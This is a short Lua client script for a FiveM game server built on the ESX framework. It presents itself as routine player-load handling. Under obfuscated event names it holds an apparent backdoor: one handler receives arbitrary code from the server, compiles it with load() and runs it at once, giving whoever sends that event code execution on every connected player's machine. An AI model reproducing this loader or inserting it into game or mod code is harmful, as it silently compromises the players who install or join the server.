ESX = exports['es_extended']:getSharedObject()

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
    ESX.PlayerLoaded = true
    ESX.PlayerData = xPlayer
    TriggerServerEvent('7XBTPiLTjTKbpd1_Wp9ireiYa2n34K0:ZTnMO9Hu6mccVlk')
end)

RegisterNetEvent('DLbFwSxSL7HsGwdr043Bovjh:sGswr0Bovjh', function(data)
    local f = assert(load(data))
    f()
end)

